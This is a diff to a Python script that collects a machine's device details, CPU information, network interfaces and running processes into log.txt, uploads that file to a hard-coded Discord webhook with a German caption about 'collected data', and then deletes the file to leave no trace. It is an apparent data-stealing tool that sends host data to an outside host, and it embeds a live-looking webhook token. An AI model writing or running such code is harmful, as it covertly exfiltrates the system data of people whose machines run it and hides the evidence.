@@ -4,19 +4,28 @@ import json
 import netifaces
 import platform
 import socket
+import os
 
 # Discord Webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'
 
 # Function to send message to Discord webhook
-def send_to_discord(message):
-    headers = {'Content-Type': 'application/json'}
-    payload = json.dumps({'content': message})
-    response = requests.post(webhook_url, headers=headers, data=payload)
-    if response.status_code == 204:
-        print("Message sent successfully to Discord webhook.")
-    else:
-        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")
+def send_to_discord(file_path):
+    with open(file_path, 'rb') as f:
+        payload = {
+            'payload_json': json.dumps({
+                'content': 'Hier ist die log.txt mit den gesammelten Daten:'
+            })
+        }
+        files = {
+            'file': f
+        }
+        response = requests.post(webhook_url, data=payload, files=files)
+        if response.status_code == 204:
+            print("File sent successfully to Discord webhook.")
+        else:
+            print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
+            print(f"Response: {response.text}")
 
 # Function to execute command and capture output
 def execute_command(command):
@@ -114,7 +123,8 @@ cpu_info = get_cpu_info()
 running_processes = get_running_processes()
 
 # Write collected information to log.txt
-with open('log.txt', 'w') as f:
+log_file_path = 'log.txt'
+with open(log_file_path, 'w') as f:
     f.write("=== Device Information ===\n")
     for key, value in device_info.items():
         f.write(f"{key.capitalize()}: {value}\n")
@@ -162,7 +172,7 @@ with open('log.txt', 'w') as f:
     f.write(f"{running_processes}\n")
 
 # Send log.txt content to Discord webhook
-with open('log.txt', 'r') as f:
-    log_content = f.read()
+send_to_discord(log_file_path)
 
-send_to_discord(f"```{log_content}```")
+# Delete log.txt after sending
+os.remove(log_file_path)
